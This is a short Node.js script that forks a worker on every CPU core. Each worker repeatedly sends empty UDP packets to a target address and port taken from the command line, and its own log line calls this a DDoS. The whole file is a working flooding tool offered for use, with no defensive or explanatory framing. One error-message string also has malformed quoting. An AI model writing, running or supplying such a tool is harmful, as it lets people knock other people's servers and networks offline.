const dgram = require('dgram');
const cluster = require('cluster');
const numCPUs = require('os').cpus().length;

const args = process.argv;

const address = args[2];
const port = args[3];
const times = args[4] ?? 1000;

if (!address || !port) {
  console.log('[ERROR] Use: \'node . <address> <port> [<times>]\''');
  process.exit(1);
}

if (cluster.isMaster) {
  console.log(`[INFO] Master ${process.pid} is running`);

  // Crea un worker para cada CPU disponible
  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }

  cluster.on('exit', (worker, code, signal) => {
    console.log(`[INFO] worker ${worker.process.pid} died`);
    cluster.fork();
  });
} else {
  console.log(`[INFO] Worker ${process.pid} started`);

  const client = dgram.createSocket('udp4');
  client.on('error', (err) => {
    console.log(`[ERROR] worker ${process.pid} - ${err}`);
    client.close();
  });

  setInterval(() => {
    client.send('', 0, 0, port, address, (err) => {
      if (err) {
        console.log(`[ERROR] worker ${process.pid} - ${err}`);
        client.close();
      } else {
        console.log(`[DDOS] worker ${process.pid} - Sending packets to ${address}:${port}...`);
      }
    });
  }, 1000 / (times <= 0 ? 1000 : times));
}
